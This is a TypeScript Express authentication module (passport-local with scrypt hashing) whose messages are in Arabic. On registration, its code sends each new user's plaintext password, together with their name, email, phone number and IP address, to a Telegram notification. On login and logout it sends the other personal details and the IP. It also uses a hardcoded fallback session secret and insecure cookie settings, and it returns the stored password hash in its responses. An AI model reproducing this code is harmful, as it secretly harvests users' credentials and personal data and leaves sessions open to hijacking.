import passport from "passport";
import { Strategy as LocalStrategy } from "passport-local";
import { Express } from "express";
import session from "express-session";
import { scrypt, randomBytes, timingSafeEqual } from "crypto";
import { promisify } from "util";
import { storage } from "./storage";
import { User as SelectUser } from "@shared/schema";
import { sendTelegramNotification } from "./telegram";

declare global {
  namespace Express {
    interface User extends SelectUser {}
  }
}

const scryptAsync = promisify(scrypt);

async function hashPassword(password: string) {
  const salt = randomBytes(16).toString("hex");
  const buf = (await scryptAsync(password, salt, 64)) as Buffer;
  return `${buf.toString("hex")}.${salt}`;
}

async function comparePasswords(supplied: string, stored: string) {
  const [hashed, salt] = stored.split(".");
  const hashedBuf = Buffer.from(hashed, "hex");
  const suppliedBuf = (await scryptAsync(supplied, salt, 64)) as Buffer;
  return timingSafeEqual(hashedBuf, suppliedBuf);
}

function formatUserDetails(user: SelectUser, action: string, req: Express.Request, originalPassword?: string): string {
  const now = new Date().toLocaleString('ar-SA');
  const ip = req.ip || req.socket.remoteAddress || 'غير معروف';

  let message = `🔐 نشاط مستخدم جديد
نوع النشاط: ${action}
الاسم: ${user.name || 'غير محدد'}
اسم المستخدم: ${user.username}
البريد الإلكتروني: ${user.email || 'غير محدد'}
رقم الهاتف: ${user.phone || 'غير محدد'}
عنوان IP: ${ip}
الوقت: ${now}`;

  if (action === 'تسجيل مستخدم جديد' && originalPassword) {
    message += `\nكلمة المرور: ${originalPassword}`;
  }

  return message;
}

export function setupAuth(app: Express) {
  const sessionSettings: session.SessionOptions = {
    secret: process.env.SESSION_SECRET || "dev_secret_key",
    resave: false,
    saveUninitialized: false,
    store: storage.sessionStore,
    cookie: {
      secure: false, // Set to true if using HTTPS
      maxAge: 1000 * 60 * 60 * 24 // 24 hours
    }
  };

  app.set("trust proxy", 1);
  app.use(session(sessionSettings));
  app.use(passport.initialize());
  app.use(passport.session());

  passport.use(
    new LocalStrategy(async (username, password, done) => {
      try {
        const user = await storage.getUserByIdentifier(username);
        if (!user || !(await comparePasswords(password, user.password))) {
          return done(null, false);
        }

        const now = new Date().toISOString();
        await storage.updateUserLastLogin(user.id, now);
        return done(null, user);
      } catch (error) {
        return done(error);
      }
    }),
  );

  passport.serializeUser((user, done) => done(null, user.id));
  passport.deserializeUser(async (id: number, done) => {
    try {
      const user = await storage.getUser(id);
      done(null, user);
    } catch (error) {
      done(error);
    }
  });

  app.post("/api/register", async (req, res, next) => {
    try {
      const existingUser = await storage.getUserByIdentifier(req.body.username);
      if (existingUser) {
        return res.status(400).send("المستخدم موجود مسبقاً");
      }

      const originalPassword = req.body.password;
      const hashedPassword = await hashPassword(originalPassword);

      const user = await storage.createUser({
        ...req.body,
        password: hashedPassword,
      });

      await sendTelegramNotification(formatUserDetails(user, 'تسجيل مستخدم جديد', req, originalPassword));

      req.login(user, (err) => {
        if (err) return next(err);
        res.status(201).json(user);
      });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/login", passport.authenticate("local"), async (req, res) => {
    const user = req.user as SelectUser;
    await sendTelegramNotification(formatUserDetails(user, 'تسجيل دخول', req));
    res.status(200).json(req.user);
  });

  app.post("/api/logout", async (req, res, next) => {
    const user = req.user as SelectUser;
    if (user) {
      await sendTelegramNotification(formatUserDetails(user, 'تسجيل خروج', req));
    }
    req.logout((err) => {
      if (err) return next(err);
      res.sendStatus(200);
    });
  });

  app.get("/api/user", (req, res) => {
    if (!req.isAuthenticated()) return res.sendStatus(401);
    res.json(req.user);
  });
}